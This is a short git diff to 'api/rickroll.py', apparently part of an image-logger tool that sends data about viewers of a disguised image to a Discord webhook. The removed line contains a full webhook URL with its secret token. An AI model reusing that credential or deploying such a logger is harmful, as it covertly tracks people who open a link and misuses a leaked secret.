d0e9e81e62b068d7b23f8dee46adc98761c9ec4a
Chromosomess <bugthemonke@gmail.com>
2025-08-29 12:23:28 +0200

    Update rickroll.py

--- api/rickroll.py
+++ api/rickroll.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1402618562555809792/f-Usoh0GY960bJwKGo1_wVrZ7Wu44EVOhl_coNci6vB-G3iHMKEOC7EAZfTEhKbELBb0",
+    "webhook": "https://discord.com/api/webhooks/",
     "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
